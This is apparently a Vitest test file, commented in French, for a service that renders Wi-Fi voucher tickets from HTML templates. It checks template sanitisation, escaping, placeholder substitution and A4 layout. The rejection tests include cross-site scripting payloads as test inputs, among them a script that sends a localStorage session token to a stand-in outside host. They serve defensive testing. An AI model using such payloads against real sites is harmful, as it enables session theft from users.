import { describe, expect, it, beforeEach } from 'vitest';
import { TemplateRejected, TicketRenderService } from './ticket-render.service.js';

const SAMPLE = {
  code: 'KF77HRT7C4',
  planName: '1Jour-2000Ar',
  price: '2 000 MGA',
  currency: 'MGA',
  validity: '1 j',
  wifiName: 'Zone WIFI-TATI',
  logoUrl: 'https://exemple.test/logo.png',
  createdAt: '18/09/2026',
  ticketIndex: '1',
  ticketTotal: '30',
  qrUrl: 'data:image/svg+xml;base64,PHN2Zy8+',
};

describe('TicketRenderService', () => {
  let service: TicketRenderService;

  beforeEach(() => {
    service = new TicketRenderService();
  });

  describe('modèles refusés', () => {
    // Le modèle est écrit par un ADMIN et ouvert par un OPERATEUR : le jeton
    // de session vit dans le localStorage du navigateur qui l'ouvre.
    it('refuse une balise script', () => {
      expect(() =>
        service.assertSafe('<div><script>fetch("//ailleurs/"+localStorage.token)</script></div>'),
      ).toThrow(TemplateRejected);
    });

    it('refuse un attribut d\'événement', () => {
      expect(() => service.assertSafe('<img src=x onerror="alert(1)" />')).toThrow(
        TemplateRejected,
      );
    });

    it('refuse une adresse javascript:', () => {
      expect(() => service.assertSafe('<img src="javascript:alert(1)" />')).toThrow(
        TemplateRejected,
      );
    });

    it('refuse une iframe', () => {
      expect(() => service.assertSafe('<iframe src="https://ailleurs"></iframe>')).toThrow(
        TemplateRejected,
      );
    });

    it('dit ce qui pose problème plutôt que de nettoyer en silence', () => {
      try {
        service.assertSafe('<div><script>x</script></div>');
        throw new Error('aurait dû être refusé');
      } catch (error) {
        expect(error).toBeInstanceOf(TemplateRejected);
        expect((error as TemplateRejected).reasons.join()).toContain('script');
      }
    });
  });

  describe('modèles acceptés', () => {
    it('laisse passer de la mise en forme', () => {
      expect(() =>
        service.assertSafe(
          '<div style="text-align:center"><img src="https://x/logo.png" /><strong>{{code}}</strong></div>',
        ),
      ).not.toThrow();
    });

    it('laisse passer une image embarquée en base64', () => {
      expect(() => service.assertSafe('<img src="data:image/png;base64,iVBORw0K" />')).not.toThrow();
    });
  });

  describe('substitution', () => {
    it('remplace les valeurs connues', () => {
      const { html } = service.renderOne('<b>{{code}}</b> — {{price}}', SAMPLE);
      expect(html).toBe('<b>KF77HRT7C4</b> — 2 000 MGA');
    });

    it('échappe les valeurs substituées', () => {
      // Une offre nommée avec des chevrons ne doit pas introduire de balise.
      const { html } = service.renderOne('<b>{{planName}}</b>', {
        ...SAMPLE,
        planName: '<script>x</script>',
      });
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('rend vide un placeholder inconnu et le signale', () => {
      const { html, unknownPlaceholders } = service.renderOne('[{{inexistant}}]', SAMPLE);
      expect(html).toBe('[]');
      expect(unknownPlaceholders).toEqual(['inexistant']);
    });
  });

  describe('feuille A4', () => {
    it('dispose 30 tickets en trois colonnes, sans coupure entre pages', () => {
      const tickets = Array.from({ length: 30 }, (_, i) => ({ ...SAMPLE, code: `CODE${i}` }));
      const { html } = service.renderSheet('<b>{{code}}</b>', tickets, {
        perPage: 30,
        title: 'Tickets',
      });

      expect(html).toContain('size: A4');
      expect(html).toContain('repeat(3, 1fr)');
      expect(html).toContain('break-inside: avoid');
      expect(html.match(/class="ticket"/g)).toHaveLength(30);
      expect(html).toContain('CODE29');
    });

    it('pose une politique de sécurité dans le document rendu', () => {
      const { html } = service.renderSheet('<b>{{code}}</b>', [SAMPLE], {
        perPage: 30,
        title: 'Tickets',
      });
      expect(html).toContain("default-src 'none'");
    });

    it('numérote chaque ticket dans le lot', () => {
      const tickets = Array.from({ length: 3 }, () => ({ ...SAMPLE }));
      const { html } = service.renderSheet('{{ticketIndex}}/{{ticketTotal}}', tickets, {
        perPage: 10,
        title: 'Tickets',
      });
      expect(html).toContain('1/3');
      expect(html).toContain('3/3');
    });
  });
});
